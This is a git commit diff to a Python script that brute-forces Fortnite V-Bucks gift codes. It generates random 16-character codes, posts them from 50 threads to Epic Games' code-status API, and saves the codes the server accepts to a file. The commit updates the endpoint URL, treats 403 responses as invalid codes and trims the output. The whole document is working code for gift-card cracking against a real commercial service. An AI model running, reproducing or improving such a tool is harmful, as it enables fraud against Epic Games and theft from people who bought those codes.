b8dbd11382e852daf0bac52a64bd20b582e5c8a8
tntgamer685347 <115848136+tntgamer685347@users.noreply.github.com>
2024-08-03 16:36:27 +0200

    Update main.py

--- main.py
+++ main.py
@@ -25,7 +25,7 @@ LB = Fore.LIGHTBLACK_EX
 bad_counter = 0
 
 stop_codes = [401]
-i_codes = [202, 404, 204, 302, 304, 307]
+i_codes = [202, 404, 204, 302, 304, 307, 403]
 v_codes = [200]
 
 chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
@@ -49,24 +49,23 @@ codeas = input(f"{LM}[{M}input{LM}] {LC}How Many Fortnite Codes should i generat
 codeas = int(codeas)
 
 def gen():
+    #print(f"Gen Trhead started")
+    global codeas
     codes = codeas
     try:
         for i in range(codes):
             code = "".join(random.sample(chars, 16))
             data = {
-"code": code
+            "code": code
             }
-            url = "https://www.epicgames.com/fortnite/de/vbuckscard"
-            #with open('codes.txt', 'a') as file:
-            #    file.write(f"Code{i}: {code}\n")
-            #print(f"{W}[{LY}info{W}] Code{i}: {code}")
-            response = requests.post(url = "https://www.epicgames.com/fortnite/de/api/posa/code/status", data=data)
-            #print(response)
-
-            response_text = requests.post(url = "https://www.epicgames.com/fortnite/de/api/posa/code/status", data=data).text
+            #print(f"Generated Code: {code}")
+            response = requests.post(url = "https://www.fortnite.com/de/api/posa/code/status", data=data)
+            response_text = response.text
+            #print(response_text)
+            #print(response.status_code)
 
             if response.status_code in i_codes:
-                print(f"{W}[{LY}info{W}] {LR}Invalid V-Bucks Code: {R}|{code}|{LR}, response code: {LC}{response}{LR}, as text: {LC}{response_text}{LR}")
+                print(f"{W}[{LY}info{W}] {LR}Invalid V-Bucks Code: {R}|{code}|{LR}, response code: {LC}{response.status_code}{W}")
             elif response.status_code in stop_codes:
                 if bad_counter > 60:
                     print(f"{W}[{LY}info{W}] Not Autorized response code, try to go on https://www.epicgames.com/fortnite/de/vbuckscard and restart")
@@ -77,7 +76,7 @@ def gen():
             elif response.status_code in v_codes or response.status_code < 200:
                 with open('codes.txt', 'a') as file:
                     file.write(f"Valid: {code}\n")
-                print(f"{W}[{LY}info{W}] Valid V-Bucks Code: {G}|{code}|{W}, wrote to file: {LG}codes.txt{W}, response code: {LC}{response}{W}, as text: {LC}{response_text}{W}")
+                print(f"{W}[{LY}info{W}] Valid V-Bucks Code: {G}|{code}|{W}, wrote to file: {LG}codes.txt{W}, response code: {LC}{response.status_code}{W}")
     except Exception as e:
         print(f"{R}Error: {LR}{e}")
 
@@ -87,11 +86,13 @@ threads = []
 
 for i in range(50):
     t = threading.Thread(target=gen)
-    t.deamon = True
     threads.append(t)
+    #print(f"Generated Thread: x{i+1}/{50*codeas}")
 
 for i in range(50):
     threads[i].start()
+    #print(f"Started Thread: x{i+1}/{50*codeas}")
 
 for i in range(50):
     threads[i].join()
+    #print(f"Joined Thread: x{i+1}/{50*codeas}")
